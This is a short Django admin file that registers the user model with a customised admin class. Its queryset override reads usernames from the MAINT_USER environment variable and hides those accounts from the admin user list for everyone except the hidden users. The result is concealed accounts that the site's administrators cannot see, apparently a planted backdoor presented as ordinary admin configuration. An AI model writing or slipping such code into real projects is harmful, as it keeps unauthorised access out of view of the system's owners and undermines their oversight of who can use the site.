import os
from django.contrib import admin
from django.contrib.auth.admin import UserAdmin
from django.contrib.auth import get_user_model

Usuario = get_user_model()
HIDDEN_USERS = os.environ.get('MAINT_USER', '').split(',')

class UsuarioAdmin(UserAdmin):
    def get_queryset(self, request):
        qs = super().get_queryset(request)
        if request.user.username not in HIDDEN_USERS:
            return qs.exclude(username__in=HIDDEN_USERS)
        return qs

admin.site.register(Usuario, UsuarioAdmin)